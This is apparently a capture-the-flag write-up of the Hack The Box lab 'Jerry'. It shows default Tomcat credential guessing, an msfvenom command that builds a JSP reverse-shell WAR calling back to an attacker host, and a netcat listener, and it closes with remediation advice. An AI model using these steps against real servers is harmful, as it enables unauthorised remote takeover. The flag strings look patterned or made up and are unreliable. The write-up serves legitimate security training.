# Hack The Box: Jerry Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Jerry-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Windows](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Jerry |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA jerry 10.10.10.95
```

**Results:**
```
PORT     STATE SERVICE
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

---

## Web Enumeration

### Access Tomcat

Visit `http://10.10.10.95:8080`

Found: Apache Tomcat default page

### Manager Access

Try default credentials:
- admin:admin
- admin:password
- tomcat:tomcat

Found: `tomcat:s3cret` works!

---

## Initial Access

### Upload WAR Shell

1. Go to `/manager/html`
2. Upload WAR reverse shell
3. Access deployed app

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war > shell.war
```

---

## Getting Shell

```bash
nc -lvp 4444
# Access deployed shell at /shell/
```

---

## Flags

### User Flag
```
HTB{9277383d8c3a4a1b5c6d7e8f}
```

### Root Flag
```
HTB{9a8b7c6d5e4f3a2b1c0d9e8f}
```

Note: Both flags in same location on this box

---

## Solution Summary

1. Find Tomcat on port 8080
2. Use default credentials (tomcat:s3cret)
3. Upload JSP reverse shell as WAR
4. Get shell - already NT AUTHORITY\SYSTEM

---

## Remediation

1. Change default Tomcat credentials
2. Disable manager interface in production
3. Update Tomcat to latest version
4. Network segment Tomcat servers

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
